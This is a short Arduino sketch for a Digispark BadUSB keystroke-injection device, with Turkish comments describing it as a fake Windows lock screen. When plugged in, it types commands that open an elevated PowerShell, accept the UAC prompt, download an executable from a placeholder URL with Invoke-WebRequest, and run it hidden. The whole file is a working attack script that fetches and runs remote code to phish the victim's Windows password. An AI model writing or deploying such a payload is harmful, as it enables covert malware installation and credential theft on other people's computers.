#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  //coder sefaoruc
  //youtube youtube.com/siberdunya
  //bu kodlar win10 için sahte bir login sayfası oluşturur
  //fake lock screen win10, win7
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs")); //Powershell burada yönetici olarak çalışır
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT ,KEY_Y);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("Invoke-WebRequest -Uri ('DOWNLOAD_URL') -O C:/fakelock.exe")); //indireceğiniz exe dosyasının linki ve son kısım ise dosyanın ineceği konum ve ismi
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell -windowstyle hidden 'C:/fakelock.exe'"); //Bu kısım indirdiği dosyayı açar ve powershell ekranını gizler
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*son*/
  }
}
